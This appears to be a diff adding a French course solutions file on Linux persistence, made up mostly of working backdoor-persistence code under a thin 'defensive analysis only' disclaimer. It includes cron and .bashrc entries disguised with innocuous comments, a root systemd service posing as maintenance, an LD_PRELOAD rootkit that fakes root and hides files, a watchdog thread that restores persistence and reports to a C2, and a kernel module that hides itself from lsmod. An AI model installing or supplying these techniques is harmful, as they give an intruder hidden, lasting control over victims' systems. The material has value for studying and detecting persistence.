@@ -1,0 +1,313 @@
+SOLUTIONS - MODULE 33 : LINUX PERSISTENCE
+
+⚠️ AVERTISSEMENT : Architectures pour analyse défensive uniquement.
+
+SOLUTION 1 : CRON PERSISTENCE MULTI-TRIGGERS
+
+Multiples cron jobs :
+@reboot /tmp/.hidden
+0 * * * * /tmp/.hidden  # Toutes les heures
+@daily /tmp/.cleanup
+@weekly /tmp/.update
+
+Installation programmatique :
+(crontab -l 2>/dev/null; echo '@reboot /tmp/.hidden') | crontab -
+
+Vérification :
+crontab -l | grep '.hidden'
+
+Backup si supprimé (watchdog) :
+if ! crontab -l | grep -q '.hidden'; then
+    (crontab -l; echo '@reboot /tmp/.hidden') | crontab -
+fi
+
+
+SOLUTION 2 : SYSTEMD SERVICE COMPLET
+
+/etc/systemd/system/sys-maint.service :
+[Unit]
+Description=System Maintenance Service
+After=network.target
+
+[Service]
+Type=forking
+ExecStart=/usr/local/bin/backdoor
+Restart=always
+RestartSec=10
+StandardOutput=null
+StandardError=null
+User=root
+
+[Install]
+WantedBy=multi-user.target
+
+Installation :
+systemctl daemon-reload
+systemctl enable sys-maint.service
+systemctl start sys-maint.service
+
+User-level service (pas besoin root) :
+~/.config/systemd/user/my-service.service
+systemctl --user enable my-service.service
+
+
+SOLUTION 3 : BASHRC/PROFILE STEALTHY
+
+Ajout discret avec commentaire légitime :
+echo "" >> ~/.bashrc
+echo "# Update package cache" >> ~/.bashrc
+echo "/tmp/.update &>/dev/null &" >> ~/.bashrc
+
+Multiples fichiers :
+~/.bashrc, ~/.bash_profile, ~/.profile, ~/.zshrc
+
+Vérification éviter duplicata :
+if ! grep -q '/tmp/.update' ~/.bashrc; then
+    echo '/tmp/.update &' >> ~/.bashrc
+fi
+
+Global (nécessite root) :
+echo '/tmp/.global' >> /etc/profile
+
+
+SOLUTION 4 : LD_PRELOAD ROOTKIT
+
+hook.c :
+
+```bash
+#define _GNU_SOURCE
+#include <dlfcn.h>
+#include <unistd.h>
+#include <dirent.h>
+#include <string.h>
+```
+
+
+```c
+// Fake root UID
+```
+uid_t getuid(void) {
+    return 0;
+}
+
+uid_t geteuid(void) {
+    return 0;
+}
+
+
+```c
+// Cacher fichiers/processus
+```
+struct dirent *readdir(DIR *dirp) {
+    struct dirent *(*original_readdir)(DIR*);
+    original_readdir = dlsym(RTLD_NEXT, "readdir");
+
+    struct dirent *dir;
+    while ((dir = original_readdir(dirp)) != NULL) {
+        if (strstr(dir->d_name, ".hidden") == NULL) {
+            return dir;  // Cacher fichiers contenant .hidden
+        }
+    }
+    return NULL;
+}
+
+
+```c
+// Intercepter fopen
+```
+FILE *fopen(const char *path, const char *mode) {
+    FILE *(*original_fopen)(const char*, const char*);
+    original_fopen = dlsym(RTLD_NEXT, "fopen");
+
+    if (strcmp(path, "/etc/passwd") == 0) {
+        return original_fopen("/tmp/fake_passwd", mode);
+    }
+    return original_fopen(path, mode);
+}
+
+Compilation :
+gcc -shared -fPIC -o hook.so hook.c -ldl
+
+Installation :
+echo '/path/to/hook.so' >> /etc/ld.so.preload
+
+Test :
+LD_PRELOAD=./hook.so id  # Devrait afficher uid=0
+
+
+SOLUTION 5 : XDG AUTOSTART DESKTOP
+
+~/.config/autostart/sys-update.desktop :
+[Desktop Entry]
+Type=Application
+Name=System Update Service
+Comment=Checks for system updates
+Exec=/tmp/.hidden
+Icon=system-software-update
+Terminal=false
+Hidden=false
+NoDisplay=true
+X-GNOME-Autostart-enabled=true
+X-KDE-autostart-after=panel
+
+Installation programmatique :
+mkdir -p ~/.config/autostart
+cat > ~/.config/autostart/sys-update.desktop << EOF
+[Desktop Entry]
+Type=Application
+Exec=/tmp/.backdoor
+NoDisplay=true
+EOF
+
+Détection : ls ~/.config/autostart/
+
+
+SOLUTION 6 : INIT SCRIPTS (LEGACY)
+
+/etc/rc.local (SysV legacy) :
+
+```bash
+#!/bin/sh
+```
+/tmp/.hidden &
+exit 0
+
+chmod +x /etc/rc.local
+
+/etc/init.d/malware :
+
+```bash
+#!/bin/sh
+### BEGIN INIT INFO
+# Provides: malware
+# Required-Start: $network
+# Default-Start: 2 3 4 5
+# Default-Stop: 0 1 6
+### END INIT INFO
+```
+
+case "$1" in
+    start)
+        /usr/local/bin/backdoor &
+        ;;
+    stop)
+        killall backdoor
+        ;;
+esac
+
+Installation :
+chmod +x /etc/init.d/malware
+update-rc.d malware defaults
+
+
+SOLUTION 7 : MULTI-METHOD REDUNDANCY
+
+Watchdog thread :
+
+```c
+void *watchdog_thread(void *arg) {
+```
+    while (1) {
+
+```c
+        // Vérifier cron
+```
+        if (system("crontab -l | grep -q '.hidden'") != 0) {
+            system("(crontab -l; echo '@reboot /tmp/.hidden') | crontab -");
+            log_to_c2("Cron restored");
+        }
+
+
+```c
+        // Vérifier .bashrc
+        char bashrc[512];
+```
+        snprintf(bashrc, sizeof(bashrc), "%s/.bashrc", getenv("HOME"));
+        char cmd[1024];
+        snprintf(cmd, sizeof(cmd), "grep -q '.hidden' %s", bashrc);
+        if (system(cmd) != 0) {
+            FILE *f = fopen(bashrc, "a");
+            fprintf(f, "/tmp/.hidden &\n");
+            fclose(f);
+            log_to_c2(".bashrc restored");
+        }
+
+
+```c
+        // Vérifier systemd service
+```
+        if (system("systemctl is-enabled sys-maint 2>/dev/null") != 0) {
+            install_systemd_service();
+            log_to_c2("systemd restored");
+        }
+
+        sleep(300 + rand() % 300);  // 5-10 minutes aléatoire
+    }
+}
+
+Installation multiple :
+install_cron();
+install_bashrc();
+install_systemd();
+install_xdg_autostart();
+install_ld_preload();
+pthread_create(&tid, NULL, watchdog_thread, NULL);
+
+
+SOLUTION 8 : KERNEL MODULE PERSISTENCE
+
+malicious.ko module :
+
+```c
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
+```
+
+MODULE_LICENSE("GPL");
+
+static int __init malicious_init(void) {
+    printk(KERN_INFO "Loading malicious module\n");
+
+
+```c
+    // Cacher module de lsmod
+```
+    list_del(&__this_module.list);
+
+
+```c
+    // Hook syscalls, cacher fichiers/processus
+    // ...
+```
+
+    return 0;
+}
+
+static void __exit malicious_exit(void) {
+    printk(KERN_INFO "Unloading malicious module\n");
+}
+
+module_init(malicious_init);
+module_exit(malicious_exit);
+
+Compilation :
+obj-m += malicious.o
+make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+Installation :
+insmod malicious.ko
+
+Persistence via /etc/modules-load.d/ :
+echo 'malicious' > /etc/modules-load.d/malicious.conf
+
+Détection difficile : lsmod ne montrera pas module caché
+
+
+RÉFÉRENCES :
+- MITRE ATT&CK Linux Persistence (T1053, T1543)
+- chkrootkit/rkhunter documentation
+- systemd.service man page
+- Linux rootkit techniques
+- LD_PRELOAD tricks (phrack)
+
